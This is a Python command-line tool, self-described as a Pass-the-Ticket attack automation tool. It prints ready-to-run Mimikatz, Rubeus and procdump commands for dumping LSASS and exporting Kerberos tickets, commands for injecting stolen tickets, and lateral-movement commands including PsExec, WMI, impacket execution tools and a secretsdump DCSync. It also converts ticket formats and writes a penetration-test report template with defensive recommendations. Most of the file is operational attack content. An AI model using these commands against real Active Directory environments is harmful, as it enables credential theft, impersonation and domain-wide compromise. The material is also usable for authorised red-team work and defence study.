#!/usr/bin/env python3
"""
Pass-the-Ticket Attack Automation Tool

Automates PtT workflow including:
- Ticket extraction command generation
- Ticket format conversion
- Lateral movement command generation
- Attack documentation and reporting

Usage:
    python process.py --mode extract --target workstation01
    python process.py --mode convert --input ticket.kirbi --output ticket.ccache
    python process.py --mode lateral --ticket ticket.ccache --target dc01.domain.local
    python process.py --mode report --output ptt_report.md

Requirements:
    pip install rich impacket
"""

import argparse
import base64
import json
import struct
import sys
from datetime import datetime
from pathlib import Path
from typing import Any

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
except ImportError:
    print("[!] Missing dependencies. Install with: pip install rich")
    sys.exit(1)

console = Console()


def generate_extraction_commands(target: str, method: str = "all") -> dict:
    """Generate commands for ticket extraction."""
    commands = {
        "mimikatz": {
            "description": "Extract tickets using Mimikatz",
            "commands": [
                "privilege::debug",
                "sekurlsa::tickets /export",
                f"# Tickets exported to current directory as .kirbi files",
                "# Look for TGT tickets: *krbtgt*.kirbi",
                "# Look for high-value TGS: *cifs*dc*.kirbi, *ldap*dc*.kirbi",
            ],
        },
        "rubeus": {
            "description": "Extract tickets using Rubeus",
            "commands": [
                ".\\Rubeus.exe dump",
                "# For specific LUID:",
                ".\\Rubeus.exe dump /luid:0x3e4",
                "# TGT delegation trick (no admin required):",
                ".\\Rubeus.exe tgtdeleg",
                "# Monitor for new logons:",
                ".\\Rubeus.exe monitor /interval:5 /filteruser:administrator",
            ],
        },
        "procdump": {
            "description": "Dump LSASS for offline extraction",
            "commands": [
                f"procdump.exe -ma lsass.exe lsass.dmp",
                "# Then offline with Mimikatz:",
                "sekurlsa::minidump lsass.dmp",
                "sekurlsa::tickets /export",
            ],
        },
    }

    if method != "all":
        return {method: commands.get(method, {})}
    return commands


def generate_injection_commands(ticket_path: str, ticket_format: str = "kirbi") -> dict:
    """Generate commands for ticket injection."""
    commands = {
        "windows_mimikatz": [
            "# Purge existing tickets",
            "kerberos::purge",
            f"# Inject ticket",
            f"kerberos::ptt {ticket_path}",
            "# Verify",
            "kerberos::list",
        ],
        "windows_rubeus": [
            f"# Inject from file",
            f".\\Rubeus.exe ptt /ticket:{ticket_path}",
            "# Create process with ticket (safer - doesn't modify current session)",
            f".\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /ptt /ticket:{ticket_path}",
        ],
        "linux_impacket": [
            f"# Convert if needed (kirbi to ccache)",
            f"impacket-ticketConverter {ticket_path} ticket.ccache",
            "# Set environment variable",
            "export KRB5CCNAME=ticket.ccache",
            "# Verify ticket",
            "klist",
        ],
    }
    return commands


def generate_lateral_movement_commands(target: str, domain: str, username: str = "administrator") -> dict:
    """Generate lateral movement commands using injected ticket."""
    commands = {
        "windows": [
            f"# Access file share",
            f"dir \\\\{target}\\c$",
            f"# Remote command execution via PsExec",
            f"PsExec.exe \\\\{target} cmd.exe",
            f"# WMI remote execution",
            f'wmic /node:"{target}" process call create "cmd.exe /c whoami > c:\\temp\\whoami.txt"',
            f"# PowerShell remoting",
            f"Enter-PSSession -ComputerName {target}",
        ],
        "linux_impacket": [
            f"# PsExec with Kerberos ticket",
            f"impacket-psexec -k -no-pass {domain}/{username}@{target}",
            f"# SMBExec",
            f"impacket-smbexec -k -no-pass {domain}/{username}@{target}",
            f"# WMIExec",
            f"impacket-wmiexec -k -no-pass {domain}/{username}@{target}",
            f"# SecretsDump (DCSync if targeting DC)",
            f"impacket-secretsdump -k -no-pass {domain}/{username}@{target}",
            f"# SMB client for file access",
            f"impacket-smbclient -k -no-pass {domain}/{username}@{target}",
        ],
    }
    return commands


def analyze_kirbi_ticket(ticket_path: str) -> dict | None:
    """Parse basic information from a .kirbi ticket file."""
    try:
        with open(ticket_path, "rb") as f:
            data = f.read()

        info = {
            "file": ticket_path,
            "size": len(data),
            "format": "kirbi" if data[:2] in [b'\x76\x82', b'\x61\x82'] else "unknown",
        }

        # Basic ASN.1 parsing - extract visible strings
        strings = []
        i = 0
        while i < len(data):
            if 32 <= data[i] <= 126:
                s = ""
                while i < len(data) and 32 <= data[i] <= 126:
                    s += chr(data[i])
                    i += 1
                if len(s) > 3:
                    strings.append(s)
            i += 1

        info["extracted_strings"] = strings[:20]

        # Try to identify realm and service from extracted strings
        for s in strings:
            if "." in s and s.isupper():
                info["realm"] = s
            if "/" in s:
                info["service"] = s

        return info

    except Exception as e:
        console.print(f"[red][-] Error parsing ticket: {e}[/red]")
        return None


def convert_ticket(input_path: str, output_path: str):
    """Convert between ticket formats (kirbi <-> ccache)."""
    try:
        from impacket.krb5.ccache import CCache
        from impacket.krb5 import constants

        if input_path.endswith(".kirbi") and output_path.endswith(".ccache"):
            ccache = CCache.loadKirbiFile(input_path)
            ccache.saveFile(output_path)
            console.print(f"[green][+] Converted {input_path} -> {output_path}[/green]")
        elif input_path.endswith(".ccache") and output_path.endswith(".kirbi"):
            ccache = CCache.loadFile(input_path)
            # Export each credential as kirbi
            for cred in ccache.credentials:
                kirbi_data = cred.toKirbi()
                with open(output_path, "wb") as f:
                    f.write(kirbi_data)
            console.print(f"[green][+] Converted {input_path} -> {output_path}[/green]")
        else:
            console.print("[red][-] Unsupported conversion. Use .kirbi <-> .ccache[/red]")

    except ImportError:
        console.print("[yellow][!] Impacket not installed. Use manually:[/yellow]")
        console.print(f"[cyan]impacket-ticketConverter {input_path} {output_path}[/cyan]")
    except Exception as e:
        console.print(f"[red][-] Conversion failed: {e}[/red]")


def generate_report(target: str, domain: str, findings: list[dict] | None, output_path: str):
    """Generate Pass-the-Ticket attack report."""
    report = f"""# Pass-the-Ticket Attack Report
## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---

## 1. Executive Summary

Pass-the-Ticket attack was performed against {domain} environment. Kerberos tickets
were extracted from compromised hosts and used for lateral movement to target systems.

## 2. Attack Steps

### 2.1 Ticket Extraction
- **Source Host:** [COMPROMISED HOST]
- **Method:** [Mimikatz/Rubeus/LSASS dump]
- **Tickets Extracted:** [COUNT]
- **High-Value Tickets:** [LIST]

### 2.2 Ticket Injection
- **Target:** {target}
- **Ticket Used:** [TICKET DETAILS]
- **Identity Impersonated:** [USERNAME]

### 2.3 Lateral Movement
- **Access Achieved:** [FILE SHARE/RCE/DCSYNC]
- **Evidence:** [SCREENSHOT REFERENCES]

## 3. MITRE ATT&CK Mapping

| Technique | ID | Status |
|-----------|----|--------|
| Pass the Ticket | T1550.003 | Executed |
| LSASS Memory Dump | T1003.001 | Executed |
| SMB/Admin Shares | T1021.002 | Executed |

## 4. Recommendations

1. Enable Credential Guard to protect Kerberos tickets in memory
2. Implement Protected Users security group for privileged accounts
3. Deploy LSASS protection (RunAsPPL)
4. Monitor Event ID 4769 for anomalous service ticket requests
5. Reduce TGT lifetime for privileged accounts
6. Implement network segmentation to limit lateral movement
7. Deploy advanced EDR with credential theft detection

---

*Report Classification: CONFIDENTIAL*
"""

    out = Path(output_path)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w") as f:
        f.write(report)

    console.print(f"[green][+] Report saved to: {output_path}[/green]")


def main():
    parser = argparse.ArgumentParser(description="Pass-the-Ticket Attack Tool")
    parser.add_argument("--mode", required=True,
                        choices=["extract", "inject", "lateral", "convert", "analyze", "report"],
                        help="Operation mode")
    parser.add_argument("--target", help="Target host")
    parser.add_argument("--domain", default="domain.local", help="Domain name")
    parser.add_argument("--username", default="administrator", help="Username to impersonate")
    parser.add_argument("--ticket", help="Path to ticket file")
    parser.add_argument("--input", help="Input file for conversion")
    parser.add_argument("--output", default="./ptt_report.md", help="Output path")
    parser.add_argument("--method", default="all", choices=["all", "mimikatz", "rubeus", "procdump"],
                        help="Extraction method")

    args = parser.parse_args()

    if args.mode == "extract":
        commands = generate_extraction_commands(args.target or "TARGET", args.method)
        for method, details in commands.items():
            console.print(Panel(
                "\n".join(details.get("commands", [])),
                title=f"{method}: {details.get('description', '')}",
            ))

    elif args.mode == "inject":
        if not args.ticket:
            console.print("[red][-] --ticket required[/red]")
            return
        commands = generate_injection_commands(args.ticket)
        for platform, cmds in commands.items():
            console.print(Panel("\n".join(cmds), title=platform))

    elif args.mode == "lateral":
        commands = generate_lateral_movement_commands(
            args.target or "dc01.domain.local",
            args.domain,
            args.username,
        )
        for platform, cmds in commands.items():
            console.print(Panel("\n".join(cmds), title=f"Lateral Movement - {platform}"))

    elif args.mode == "convert":
        if not args.input or not args.output:
            console.print("[red][-] --input and --output required[/red]")
            return
        convert_ticket(args.input, args.output)

    elif args.mode == "analyze":
        if not args.ticket:
            console.print("[red][-] --ticket required[/red]")
            return
        info = analyze_kirbi_ticket(args.ticket)
        if info:
            console.print(Panel(json.dumps(info, indent=2), title="Ticket Analysis"))

    elif args.mode == "report":
        generate_report(args.target or "TARGET", args.domain, None, args.output)


if __name__ == "__main__":
    main()
